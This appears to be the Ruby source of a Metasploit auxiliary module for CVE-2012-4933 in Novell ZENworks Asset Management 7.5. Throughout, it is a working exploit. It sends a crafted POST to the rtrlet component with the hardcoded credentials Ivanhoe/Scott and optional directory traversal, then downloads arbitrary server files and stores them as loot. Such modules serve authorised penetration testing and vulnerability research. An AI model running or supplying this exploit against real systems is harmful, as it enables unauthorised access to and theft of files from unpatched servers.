##
2	
# This file is part of the Metasploit Framework and may be subject to
3	
# redistribution and commercial restrictions. Please see the Metasploit
4	
# web site for more information on licensing and terms of use.
5	
#   http://metasploit.com/
6	
##
7	
8	
require 'msf/core'
9	
10	
class Metasploit3 < Msf::Auxiliary
11	
12	
        include Msf::Exploit::Remote::HttpClient
13	
        include Msf::Auxiliary::Report
14	
        include Msf::Auxiliary::Scanner
15	
16	
        def initialize(info = {})
17	
                super(update_info(info,
18	
                        'Name'           => 'Novell ZENworks Asset Management 7.5 Remote File Access',
19	
                        'Description'    => %q{
20	
                                        This module exploits a hardcoded user and password for the GetFile maintenance
21	
                                task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web
22	
                                Console and can be triggered by sending a specially crafted request to the rtrlet component,
23	
                                allowing a remote unauthenticated user to retrieve a maximum of 100_000_000 KB of
24	
                                remote files. This module has been successfully tested on Novell ZENworks Asset
25	
                                Management 7.5.
26	
                        },
27	
                        'License'        => MSF_LICENSE,
28	
                        'Author'         =>
29	
                                [
30	
                                        'juan vazquez' # Also the discoverer
31	
                                ],
32	
                        'References'     =>
33	
                                [
34	
                                        [ 'CVE', '2012-4933' ],
35	
                                        [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/10/11/cve-2012-4933-novell-zenworks' ]                                ]
36	
                ))
37	
38	
                register_options(
39	
                        [
40	
                                Opt::RPORT(8080),
41	
                                OptBool.new('ABSOLUTE', [ true, 'Use an absolute file path or directory traversal relative to the tomcat home', true ]),
42	
                                OptString.new('FILEPATH', [true, 'The name of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts']),
43	
                                OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 1])
44	
                        ], self.class)
45	
        end
46	
47	
        def run_host(ip)
48	
                # No point to continue if no filename is specified
49	
                if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
50	
                        print_error("Please supply the name of the file you want to download")
51	
                        return
52	
                end
53	
54	
                post_data = "kb=100000000&"
55	
                if datastore['ABSOLUTE']
56	
                        post_data << "file=#{datastore['FILEPATH']}&"
57	
                        post_data << "absolute=yes&"
58	
                else
59	
                        travs = "../" * (datastore['DEPTH'] || 1)
60	
                        travs << "/" unless datastore['FILEPATH'][0] == "\\" or datastore['FILEPATH'][0] == "/"
61	
                        travs << datastore['FILEPATH']
62	
                        post_data << "file=#{travs}&"
63	
                        post_data << "absolute=no&"
64	
                end
65	
                post_data << "maintenance=GetFile_password&username=Ivanhoe&password=Scott&send=Submit"
66	
67	
                print_status("#{rhost}:#{rport} - Sending request...")
68	
                res = send_request_cgi({
69	
                        'uri'          => '/rtrlet/rtr',
70	
                        'method'       => 'POST',
71	
                        'data'         => post_data,
72	
                }, 5)
73	
74	
                if res and res.code == 200 and res.body =~ /Last 100000000 kilobytes of/ and res.body =~ /File name/ and not res.body =~ /<br\/>File not found.<br\/>/
75	
                        print_good("#{rhost}:#{rport} - File retrieved successfully!")
76	
                        start_contents = res.body.index("<pre>") + 7
77	
                        end_contents = res.body.rindex("</pre>") - 1
78	
                        if start_contents.nil? or end_contents.nil?
79	
                                print_error("#{rhost}:#{rport} - Error reading file contents")
80	
                                return
81	
                        end
82	
                        contents = res.body[start_contents..end_contents]
83	
                        fname = File.basename(datastore['FILEPATH'])
84	
                        path = store_loot(
85	
                                'novell.zenworks_asset_management',
86	
                                'application/octet-stream',
87	
                                ip,
88	
                                contents,
89	
                                fname
90	
                        )
91	
                        print_status("#{rhost}:#{rport} - File saved in: #{path}")
92	
                else
93	
                        print_error("#{rhost}:#{rport} - Failed to retrieve file")
94	
                        return
95	
                end
96	
        end
97	
end
